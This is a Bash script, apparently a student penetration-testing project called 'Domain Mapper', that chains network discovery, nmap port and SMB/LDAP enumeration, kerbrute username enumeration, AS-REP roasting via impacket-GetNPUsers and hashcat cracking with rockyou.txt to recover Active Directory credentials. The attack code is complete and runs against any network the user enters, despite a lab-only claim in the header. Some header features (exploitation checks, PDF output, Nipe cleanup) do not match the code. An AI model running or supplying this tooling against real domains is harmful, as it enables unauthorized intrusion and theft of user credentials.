#!/bin/bash


#+-----------------------------------------------------------------------------------------+
#|                                                                                         |
#|                         NETWORK SECURITY | PROJECT: DOMAIN MAPPER                       |
#|                                                                                         |
#|  ▸ This Bash script automates network and domain reconnaissance for penetration testing.|
#|  ▸ It helps security professionals and students quickly gather information about a      |
#|    target network, services, and Active Directory environment.                          |
#|  ▸ Designed for safe testing on lab environments, it demonstrates scanning, enumeration,|
#|    and exploitation techniques without impacting production systems.                    |
#|                                                                                         |
#|  Features:                                                                              |
#|  ▸ Prompts the user for target network, domain, AD credentials, and password list       |
#|  ▸ Supports selectable operation levels for Scanning, Enumeration, and Exploitation     |
#|  ▸ Scanning: Basic, Intermediate, and Advanced modes, including TCP/UDP and full ports  |
#|  ▸ Enumeration: detects services, Domain Controller, DHCP, shared folders, and AD info  |
#|  ▸ Exploitation: vulnerability checks, password spraying, and Kerberos ticket testing   |
#|  ▸ Logs results and saves output as PDF files                                           |
#|  ▸ Script was tested on a lab (training) Domain Controller                              |
#|                                                                                         |
#|                              Requires root privileges!                                  |
#|                                                                                         |
#+-----------------------------------------------------------------------------------------+



# GLOBAL VARIABLES
nipe_path=""
timestamp=""
current_dir=$(pwd)
script_start=$(date +%s)
iface=$(ip link show up | grep -E '^[0-9]+' | awk -F: '{print $2}' | grep -v lo | head -n1 | tr -d ' ')

# SPINNER FUNCTION
# This function displays a spinner animation while a process is running.
SPINNER() {
    local pid=$1               # Process ID to track
    local done_message=${3:-""} # Optional message to display when done
    local delay=0.2            # Delay between spinner frames
    local spinstr='|/-\'       # Spinner characters

    # Loop until the process ends
    while kill -0 "$pid" 2>/dev/null; do
        # Loop through each spinner character
        for (( i=0; i<${#spinstr}; i++ )); do
            # Print spinner character with color formatting
            printf "\r\e[33m[%c]\e[0m %s\e[33m...\e[0m" "${spinstr:$i:1}"
            sleep $delay
        done
    done

    # Clear spinner line after process ends
    printf "\r%-60s\r" ""
}



# START FUNCTION
# This function initializes the script, checks for root privileges, 
# displays initial info, and prepares directories.
START() {
    local user=$(whoami)                 # Get current username
    if [[ "$user" != "root" ]]; then     # Check if running as root
        echo -e "\n\e[91m[!] You must run this script as root.\e[0m\n"
        exit
    fi

    timestamp=$(date +"%d%m%H%M%S")      # Save timestamp for session
    figlet "DOMAIN MAPPER"         # Display banner
    echo -e "\nOleksandr Shevchuk S21, TMagen773637\n"

    # Check internet and required utilities
    CHECK_INTERNET_CONNECTION
}



# INTERNET CHECK
# This function verifies internet connectivity and downloads required world lists.
CHECK_INTERNET_CONNECTION() {
    echo -e "\e[31m[*]\e[0m\e[34m Checking required utilities...\e[0m"
    sleep 2

    # Ping Google DNS to check internet connection
    if ping -c 1 -W 3 8.8.8.8 > /dev/null 2>&1; then
        # Update package lists in background
        apt update > /dev/null 2>&1 &
        SPINNER $!
        wait $!
        # Proceed to check and install utilities
        CHECK_APP
    else
        # No internet, exit script
        echo -e "\n\e[91m\e[107m[!] No internet connection. Check your network.\e[0m\n"
        sleep 2
        exit 1
    fi
}



# CHECK AND INSTALL UTILITIES
# This function verifies that all required utilities for the script are installed.
# If a utility is missing, it attempts to install it using 'apt'.
CHECK_APP() {
    # List of utilities to check (excluding aria2c, handled separately)
    local utilities_for_check="ftp nmap rdesktop ssh sshpass fping enscript kerbrute"
    
    # Iterate through the list and verify each utility
    for i in $utilities_for_check; do
        if ! command -v "$i" > /dev/null 2>&1; then
           if [ "$i" = "kerbrute" ]; then
                # Utility not found, attempt installation
                echo -e "\e[91m\e[107m[!] kerbrute is not installed.\e[0m"
                wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
                chmod +x kerbrute_linux_amd64
                mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
                hash -r
            else
                # Utility not found, attempt installation
                echo -e "\e[91m\e[107m[!] '$i' is not installed.\e[0m"
                apt install "$i" -y || { echo -e "\e[91m\e[107m[!] Failed to install '$i'.\e[0m"; exit 1; }
            fi
        else
            # Utility is already installed
            echo -e "\e[32m[✔] $i\e[0m"
        fi
        sleep 0.3
    done

    SELECT_SCAN_METOD
}



# SCAN SELECTION
# Prompts the user for scan parameters, sets up the environment,
# validates input, and starts either a basic internediate or full scan.
SELECT_SCAN_METOD() {

    cd "$current_dir"

    # Prompt the user to enter an IP address to scan
    read -r -p $'\n\e[31m[!]\e[0m\e[34m Enter network address/mask (CIDR), e.g., 192.168.0.0/24: \e[0m' network

    if [[ ! "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        echo -e "\e[91m[!] Wrong format. Example: 192.168.0.0/24\e[0m\n"
        SELECT_SCAN_METOD
        return
    fi

    local mode_name="scanning"
    local level=""
    while true; do
        # Prompt the user to choose scan mode: Basic or Full
        read -r -p $'\e[31m[?]\e[0m\e[34m Choose level for scanning\e[0m: [B]asic, [I]ntermediate, [A]dvanced: ' user_input       
        case "${user_input^^}" in
            B) level="Basic_$mode_name"; break;;
            I) level="Intermediate_$mode_name"; break;;
            A) level="Advanced_$mode_name"; break;;
            *) echo -e "\e[91m[!] Wrong choice. Use B, I, or A\e[0m";;
        esac
    done
    
    # Prompt the user to enter a folder name where scan results will be stored
    read -r -p $'\e[31m[!]\e[0m\e[34m Enter folder name for scan results: \e[0m' working_dir

    # Show summary and ask for confirmation
    echo -e "\n\e[31m[*]\e[0m\e[32m Please verify the entered data:\e[0m"
    echo ""
    echo -e "    Target network : $network"
    echo -e "    Scan mode      : $level"
    echo -e "    Output folder  : $working_dir"

    while true; do
        read -r -p $'\n\e[31m[?]\e[0m\e[34m Is everything correct? (Y/N): \e[0m' validation
        if [[ "$validation" =~ ^[Yy]$ ]]; then
            # Create output directory if it doesn't exist
            mkdir -p "$working_dir" > /dev/null 2>&1

            # Use fping to find live hosts in the target network and save IPs to live_hosts.txt
            echo -e "\n\e[31m[!]\e[0m\e[32m Searching for live hosts...\e[0m"
            fping -a -g "$network" 2>/dev/null | awk '{print $1}' | grep -v $(hostname -I | awk '{print $1}') > "$working_dir/live_hosts.txt" &
            SPINNER $!
            wait

            # Run the selected scan
            if [[ "$level" == "Basic_$mode_name" ]]; then
                BASIC_SCAN
            elif [[ "$level" == "Intermediate_$mode_name" ]]; then
                INTERMEDIATE_SCAN
            else
                FULL_SCAN
            fi
            break
        elif [[ "$validation" =~ ^[Nn]$ ]]; then
            # Restart the process if user declined
            echo ""
            SELECT_SCAN_METOD
            return
        else
            echo -e "\e[91m[!] Wrong choice. Example: Y or N\e[0m"
        fi
    done
}



# BASIC_SCAN
# Performs a basic TCP scan on live hosts with service/version detection.
# Saves the results in TXT and converts to PDF for easy viewing.
BASIC_SCAN() {
    echo -e "\n\e[31m[!]\e[0m\e[32m Starting BASIC SCANNING...\e[0m"

    for ip in $(cat "$working_dir/live_hosts.txt"); do
        echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"

        host_dir="$working_dir/${ip}"
        mkdir -p "$host_dir"

        scan_result_txt="$host_dir/result_${ip}.txt"

        # Write header with a single newline
        echo -e "BASIC SCANNING RESULT FOR ${ip}\n" > "$scan_result_txt" 2>/dev/null

        # Run TCP scan
        nmap -Pn "$ip" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/tcp|open' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
        wait
    done

    ENUMERATION_MODE_SELECTOR
}



# INTERMEDIATE_SCAN
# Performs a more thorough TCP scan on all 65535 ports of live hosts.
# Includes version detection and vulnerability scripts. Results saved in TXT->PDF.
INTERMEDIATE_SCAN() {
    echo -e "\n\e[31m[!]\e[0m\e[32m Starting INTERMEDIATE SCANNING...\e[0m"

    for ip in $(cat "$working_dir/live_hosts.txt"); do
        echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"

        host_dir="$working_dir/${ip}"
        mkdir -p "$host_dir"

        scan_result_txt="$host_dir/result_${ip}.txt"

        # Write header with a single newline
        echo -e "INTERMEDIATE SCANNING RESULT FOR ${ip}\n" > "$scan_result_txt" 2>/dev/null

        # Run TCP scan on all ports
        nmap -Pn -p- "$ip" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/tcp|open' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
        wait
    done

    ENUMERATION_MODE_SELECTOR
}



# FULL_SCAN
# Performs the most comprehensive scan: TCP SYN scan on all ports with OS detection,
# plus UDP scan on top 20 ports. Uses vulnerability scripts and saves results in TXT->PDF.
FULL_SCAN() {
    echo -e "\n\e[31m[!]\e[0m\e[32m Starting FULL SCANNING...\e[0m"

    for ip in $(cat "$working_dir/live_hosts.txt"); do
        echo -e "\e[31m[*]\e[0m\e[32m Scanning: ${ip}\e[0m"

        host_dir="$working_dir/${ip}"
        mkdir -p "$host_dir"

        scan_result_txt="$host_dir/result_${ip}.txt"

        # Write header
        echo -e "FULL SCANNING RESULT FOR ${ip}\n" > "$scan_result_txt" 2>/dev/null

        # Run TCP scan on all ports
        nmap -Pn -p- "$ip" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/tcp' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
        wait

        # UDP scan: top 20 ports + vuln scripts
        nmap -Pn -sU --top-ports 20 "$ip" -oN - 2>/dev/null | grep -E 'Nmap scan report|^PORT|/udp' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
        wait
    done

  ENUMERATION_MODE_SELECTOR
}



# ENUMERATION_MODE_SELECTOR
# Prompts the user to select an enumeration level: Basic, Intermediate, or Advanced.
# Depending on the choice, it calls the corresponding enumeration function (BASIC, INTERMEDIATE, or FULL).
ENUMERATION_MODE_SELECTOR() {

    while true; do
        # Ask the user to choose the scan level with colored prompt
        read -r -p $'\n\e[31m[?]\e[0m\e[34m Choose level for enumeration: [B]asic, [I]ntermediate, [A]dvanced: \e[0m' user_choice

        # Run the corresponding enumeration function based on user choice
        if [[ "$user_choice" =~ ^[Bb]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m Starting BASIC ENUMERATION...\e[0m"
            BASIC_ENUMERATION
            break

        elif [[ "$user_choice" =~ ^[Ii]$ ]]; then
            echo -e "\n\e[31m[!]\e[0m\e[32m Starting INTERMEDIATE ENUMERATION...\e[0m"
            INTERMEDIATE_ENUMERATION
            break

        elif
            [[ "$user_choice" =~ ^[Aa]$ ]]; then

            echo -e "\n\e[31m===================================================================="
            echo -e "   ⚠️  ATTENTION: Advanced Enumeration Requirements  ⚠️"
            echo -e "===================================================================="
            echo -e " Userlist AND Password List are REQUIRED."
            echo -e " - If no custom userlist is provided, default userlist will be used."
            echo -e " - If no custom password list is provided, rockyou.txt will be used."
            echo -e "====================================================================\e[0m\n"
            sleep 2
            
            # Prompt the user to enter the full path to a  userlist
            read -r -p $'\e[34m[?]\e[0m Enter full path to userlist or press enter for default userlist: ' custom_userlist

            # If no custom userlist is provided, use the default userlist from GoogleDrive
            if [[ -z "$custom_userlist" ]]; then
                data="$working_dir/world_lists"
                mkdir -p "$data"
                wget --no-check-certificate -O "$data/users.txt" "https://drive.google.com/uc?export=download&id=1FK4Ei5ovLw8g8gPOryoqdXBOAf1TEMCq" >/dev/null 2>&1
                userlist="$data/users.txt"
            else
                # Otherwise, use the path provided by the user
                userlist="$custom_userlist"
            fi
            
            # Prompt the user to enter the full path to a password list
            read -r -p $'\e[34m[?]\e[0m Enter full path to passwordlist or press enter for default passwordlist: ' custom_passwdlist

            # If no custom password list is provided, use the default rockyou.txt
            if [[ -z "$custom_passwdlist" ]]; then
                passwdlist="/usr/share/wordlists/rockyou.txt"
            else
                # Otherwise, use the path provided by the user
                passwdlist="$custom_passwdlist"
            fi
            
            # Inform the user that Advanced Enumeration is starting
            echo -e "\n\e[31m[!]\e[0m\e[32m Starting ADVANCE ENUMERATION...\e[0m"
            ADVANCED_ENUMERATION
            break
        else
            echo -e "\e[91m[!] Wrong choice. Example: B, I or A\e[0m"

        fi
    done

    STOP
}



# BASIC_ENUMERATION
# Performs basic host enumeration: scans TCP and UDP ports from previous scan results,
# detects Domain Controllers and DHCP servers, logs findings to TXT, and converts logs to PDF.
BASIC_ENUMERATION() {
    for target_ip in $(cat "$working_dir/live_hosts.txt"); do
        host_dir="$working_dir/${target_ip}"
        scan_result_txt="$host_dir/result_${target_ip}.txt"

        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${target_ip}\e[0m"
        echo -e "\nBASIC ENUMERATION RESULT FOR ${target_ip}\n" >> "$scan_result_txt" 2>/dev/null

        tcp_ports=""
        udp_ports=""

        if grep -q '/tcp' "$scan_result_txt"; then
            tcp_ports=$(grep '/tcp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
        fi

        if grep -q '/udp' "$scan_result_txt"; then
            udp_ports=$(grep '/udp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
        fi

        all_ports=$(echo "$tcp_ports,$udp_ports" | tr ',' '\n' | grep -v '^$' | sort -n -u | paste -sd, -)

        if [ -n "$all_ports" ]; then
            nmap -Pn -sV -p "$all_ports" "$target_ip" -oN - 2>/dev/null | grep -E '^PORT|/tcp|open' >> "$scan_result_txt" 2>/dev/null &
            SPINNER $!
            wait
        fi

        # DC detection, DHCP detection — дописываем в тот же файл
        if grep -q "ldap.*Active Directory" "$scan_result_txt" && grep -q "88/tcp" "$scan_result_txt" && grep -q "3268/tcp" "$scan_result_txt"; then
            msg="[+] DOMAIN CONTROLLER DETECTED ${target_ip}"
            echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
            echo -e "\e[33m$msg\e[0m"
        fi
    done

    interface=$(ip -o -4 addr show up | awk '!/lo/ {print $2; exit}')
    dhcp_output=$(nmap -e "$interface" --script broadcast-dhcp-discover 2>/dev/null)
    if echo "$dhcp_output" | grep -q "Server Identifier:"; then
        dhcp_ip=$(echo "$dhcp_output" | grep "Server Identifier:" | awk -F ':' '{print $NF}' | tr -d ' ')
        msg="[+] DHCP SERVER DETECTED ${dhcp_ip}"
        # append to last used scan_result_txt for that host (or choose to write to a global log)
        echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
        echo -e "\e[33m$msg\e[0m"
    fi
}




# INTERMEDIATE_ENUMERATION
# Performs intermediate host enumeration: expands on BASIC_ENUMERATION results for each live host.
# This function appends results to the TXT file already created in BASIC_ENUMERATION.
INTERMEDIATE_ENUMERATION() {
    for target_ip in $(cat "$working_dir/live_hosts.txt"); do
        host_dir="$working_dir/${target_ip}"
        scan_result_txt="$host_dir/result_${target_ip}.txt"

        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${target_ip}\e[0m"
        echo -e "\nINTERMEDIATE ENUMERATION RESULT FOR ${target_ip}\n" >> "$scan_result_txt" 2>/dev/null

        tcp_ports=""
        udp_ports=""

        if grep -q '/tcp' "$scan_result_txt"; then
            tcp_ports=$(grep '/tcp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
        fi

        if grep -q '/udp' "$scan_result_txt"; then
            udp_ports=$(grep '/udp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
        fi

        common_ports="21,22,139,445,389,636,3389,5985,5986"
        all_ports=$(echo "$tcp_ports,$udp_ports,$common_ports" | tr ',' '\n' | grep -v '^$' | sort -n -u | paste -sd, -)

        if [ -n "$all_ports" ]; then
            nmap -Pn -sV -p "$all_ports" "$target_ip" -oN - 2>/dev/null | grep -E '^PORT|/tcp|open' >> "$scan_result_txt" 2>/dev/null &
            SPINNER $!
            wait
        fi

        nmap -Pn -sV -p "$common_ports" --script smb-os-discovery,smb-enum-shares,smb-enum-users,ldap-search,smb-enum-domains,nbstat "$target_ip" -oN - 2>/dev/null | awk 'NR>3' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
        wait

        if grep -q "ldap.*Active Directory" "$scan_result_txt" && grep -q "88/tcp" "$scan_result_txt" && grep -q "3268/tcp" "$scan_result_txt"; then
            msg="[+] DOMAIN CONTROLLER DETECTED ${target_ip}"
            echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
            echo -e "\e[33m$msg\e[0m"
        fi
    done

    interface=$(ip -o -4 addr show up | awk '!/lo/ {print $2; exit}')
    dhcp_output=$(nmap -e "$interface" --script broadcast-dhcp-discover 2>/dev/null)
    if echo "$dhcp_output" | grep -q "Server Identifier:"; then
        dhcp_ip=$(echo "$dhcp_output" | grep "Server Identifier:" | awk -F ':' '{print $NF}' | tr -d ' ')
        msg="[+] DHCP SERVER DETECTED ${dhcp_ip}"
        echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
        echo -e "\e[33m$msg\e[0m"
    fi
}


# ADVANCED_ENUMERATION

ADVANCED_ENUMERATION() {
    for target_ip in $(cat "$working_dir/live_hosts.txt"); do
        host_dir="$working_dir/${target_ip}"
        scan_result_txt="$host_dir/result_${target_ip}.txt"

        echo -e "\e[31m[*]\e[0m\e[32m Enumeration: ${target_ip}\e[0m"
        echo -e "\nADVANCED ENUMERATION RESULT FOR ${target_ip}\n" >> "$scan_result_txt" 2>/dev/null

        tcp_ports=""
        udp_ports=""

        if grep -q '/tcp' "$scan_result_txt"; then
            tcp_ports=$(grep '/tcp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
        fi

        if grep -q '/udp' "$scan_result_txt"; then
            udp_ports=$(grep '/udp' "$scan_result_txt" | awk -F'/' '{print $1}' | paste -sd, -)
        fi

        common_ports="21,22,139,445,389,636,3389,5985,5986"
        all_ports=$(echo "$tcp_ports,$udp_ports,$common_ports" | tr ',' '\n' | grep -v '^$' | sort -n -u | paste -sd, -)

        if [ -n "$all_ports" ]; then
            nmap -Pn -sV -p "$all_ports" "$target_ip" -oN - 2>/dev/null | grep -E '^PORT|/tcp|open'| grep -i -v 'filtered' >> "$scan_result_txt" 2>/dev/null &
            SPINNER $!
            wait
        fi

        nmap -Pn -sV -p "$common_ports" --script smb-os-discovery,smb-enum-shares,smb-enum-users,ldap-search,smb-enum-domains,nbstat "$target_ip" 2>/dev/null | awk 'NR>3' | grep -i -v 'filtered' >> "$scan_result_txt" 2>/dev/null &
        SPINNER $!
        wait

        if grep -q "ldap.*Active Directory" "$scan_result_txt" && grep -q "88/tcp" "$scan_result_txt" && grep -q "3268/tcp" "$scan_result_txt"; then
            msg="[+] DOMAIN CONTROLLER DETECTED ${target_ip}"
            echo -e "\n$msg\n" >> "$scan_result_txt" 2>/dev/null
            echo -e "\e[33m$msg\e[0m"

            domain=$(grep -i 'domain' "$scan_result_txt" | awk -F 'Domain:' '{print $2}' | awk -F ',' '{print $1}' | grep -v '^[[:space:]]*$' | head -1 | xargs)
            
            kerbrute userenum  -d "$domain" --dc "${target_ip}" "$userlist" | grep VALID | awk '{print "VALID USERNAME  " $NF}' | sed 's/\x1b\[[0-9;]*m//g' >> "$scan_result_txt"

            hashes_file="$host_dir/hash_${target_ip}.txt"
            impacket-GetNPUsers "$domain"/ -usersfile "$userlist" -dc-ip ${target_ip} -format hashcat | grep -i '$krb' >> "$hashes_file"
            
            credentials="$host_dir/creds_${target_ip}.txt"
            hashcat -m 18200 -a 0 "$hashes_file" "$passwdlist" >> "$credentials" --potfile-disable &
            SPINNER $!
            wait

            if [ -s "$credentials" ]; then
                # Загружаем только строки, содержащие литерал "$krb", в массив lines
                # Используем grep -F для буквального поиска '$krb'
                mapfile -t lines < <(grep -F '$krb' "$credentials" 2>/dev/null || true)

                # Проходим по массиву через for (как ты просил)
                for line in "${lines[@]}"; do
                    brut_user=$(echo "$line" | awk -F '@' '{print $1}' | awk -F '$' '{print $NF}' | xargs) 2>/dev/null
                    brut_passwd=$(echo "$line"| awk -F '@' '{print $2}' | awk -F ':' '{print $NF}' | xargs) 2>/dev/null
                    pair="$brut_user:$brut_passwd" 
                    echo -e "\n[+] CREDENTIALS FOUND $pair" >> "$scan_result_txt" 2>/dev/null
                done
            fi
        fi
    done

    interface=$(ip -o -4 addr show up | awk '!/lo/ {print $2; exit}')
    dhcp_output=$(nmap -e "$interface" --script broadcast-dhcp-discover 2>/dev/null)
    if echo "$dhcp_output" | grep -q "Server Identifier:"; then
        dhcp_ip=$(echo "$dhcp_output" | grep "Server Identifier:" | awk -F ':' '{print $NF}' | tr -d ' ')
        msg="[+] DHCP SERVER DETECTED ${dhcp_ip}"
        echo -e "\n$msg" >> "$scan_result_txt" 2>/dev/null
        echo -e "\e[33m$msg\e[0m"
    fi
}


# STOP - Stops the Nipe service, restores original IP and MAC address, and cleans up.
STOP() {
   
    # Remove temporary data directory
    rm -rf "$data"

    # Record script end time and calculate duration
    local script_end=$(date +%s)
    local duration=$((script_end - script_start))
    echo -e "\e[31m[*]\e[0m\e[32m Script finished. \e[0mDuration: $((duration / 60)) min $((duration % 60)) sec"
}


START
